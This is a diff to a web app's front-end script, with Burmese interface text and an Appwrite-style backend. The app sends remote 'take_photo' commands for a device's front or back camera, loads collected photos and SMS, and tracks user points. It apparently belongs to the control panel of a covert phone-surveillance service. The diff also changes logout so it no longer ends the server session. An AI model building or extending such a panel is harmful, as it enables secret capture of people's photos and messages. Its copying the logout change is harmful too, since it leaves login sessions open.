@@ -761,22 +573,23 @@ async function sendCameraCommand(type) {
       action: "take_photo",
       status: "pending",
       payload: JSON.stringify({
-        camera: type,
-        chatId: chatId,
+        camera: type, chatId: chatId,
         label: type === "front" ? "Simple" : "Back",
         source: "webapp",
       }),
       expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString(),
     };
-    const cmdPath = `/tablesdb/${DB}/tables/${T_COMMANDS}/rows`;
-    await api("POST", cmdPath, { rowId: "unique()", data: cmdData });
+    await api("POST", `/tablesdb/${DB}/tables/${T_COMMANDS}/rows`, {
+      rowId: "unique()", data: cmdData
+    });
     hideOverlay();
     toast("Command sent — photo will arrive soon", "success");
   } catch (e) {
     hideOverlay();
     try {
-      const updPath = `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`;
-      await api("PATCH", updPath, { data: { points } });
+      await api("PATCH", `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`, {
+        data: { points }
+      });
       state.userRow.points = points;
       updatePointsUI();
     } catch (e2) {}
@@ -791,24 +604,6 @@ function updatePointsUI() {
 }
 
 /* ═══ BOOT ═══ */
-async function boot() {
-  try {
-    const account = await getAccount();
-    if (!account || !account.$id) throw new Error("No session");
-    state.user = account;
-    const row = await findUserRow(account.$id, account.email);
-    if (!row) {
-      showLoginError("Account ရှိပေမဲ့ users table မှာ row မတွေ့ပါ");
-      return;
-    }
-    state.userRow = row;
-    enterApp();
-  } catch (e) {
-    $("loginScreen").style.display = "flex";
-    $("appScreen").classList.remove("show");
-  }
-}
-
 function enterApp() {
   $("loginScreen").style.display = "none";
   $("appScreen").classList.add("show");
@@ -831,9 +626,36 @@ $("loginBtn").onclick = async () => {
   const btn = $("loginBtn");
   btn.disabled = true;
   btn.querySelector("span").textContent = "Logging in...";
+
   try {
-    await doLogin(email, password);
-    await boot();
+    const session = await doLogin(email, password);
+    const userId = (session && session.userId) || (session && session.user && session.user.$id);
+
+    // session.userId ရှာ (Appwrite version ပေါ်မူတည်)
+    let realUserId = userId;
+    if (!realUserId) {
+      // fallback: query users table by email
+      const q = encodeURIComponent(JSON.stringify({
+        method: "equal", attribute: "email", values: [email]
+      }));
+      const ures = await api("GET", `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q}`);
+      if (ures && ures.rows && ures.rows.length > 0) {
+        realUserId = ures.rows[0].userId;
+      }
+    }
+
+    if (!realUserId) {
+      throw new Error("User ID ရှာမတွေ့ပါ");
+    }
+
+    const row = await findUserRow(realUserId, email);
+    if (!row) {
+      showLoginError("Account ရှိပေမဲ့ users table မှာ row မတွေ့ပါ");
+      return;
+    }
+    state.userRow = row;
+    enterApp();
+
   } catch (e) {
     showLoginError(e.message);
   } finally {
@@ -865,19 +687,10 @@ document.querySelectorAll(".cam-btn").forEach(btn => {
 $("refreshPhotos").onclick = () => { showOverlay("Refreshing..."); loadPhotos().finally(hideOverlay); };
 $("refreshSms").onclick = () => { showOverlay("Refreshing..."); loadSms().finally(hideOverlay); };
 
-$("logoutBtn").onclick = async () => {
+$("logoutBtn").onclick = () => {
   if (!confirm("Logout လုပ်မှာ သေချာလား?")) return;
-  try {
-    await fetch(API + "/account/sessions/current", {
-      method: "DELETE",
-      headers: { "X-Appwrite-Project": PROJECT },
-      credentials: "include",
-    });
-  } catch (e) {}
   location.reload();
 };
-
-boot();
 </script>
 </body>
 </html>
